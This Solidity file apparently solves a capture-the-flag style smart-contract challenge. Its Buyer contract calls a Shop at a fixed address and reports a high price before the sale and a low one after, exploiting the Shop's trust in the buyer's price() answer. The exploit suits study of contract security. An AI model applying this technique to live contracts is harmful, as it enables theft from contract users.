// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface Shop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Buyer {
    uint256 cheaperPrice = 1;
    uint256 initialPrice = 100;
    address shopAddress = 0xB44565D1217cb12CA43eaF8a950573CC59Ce4973;
    Shop shopContract = Shop(shopAddress);

    function buyCheaper() external {
        shopContract.buy();
    }

    function price() external view returns (uint256) {
        if (shopContract.isSold()) {
            return cheaperPrice;
        }
        return initialPrice;
    }
}
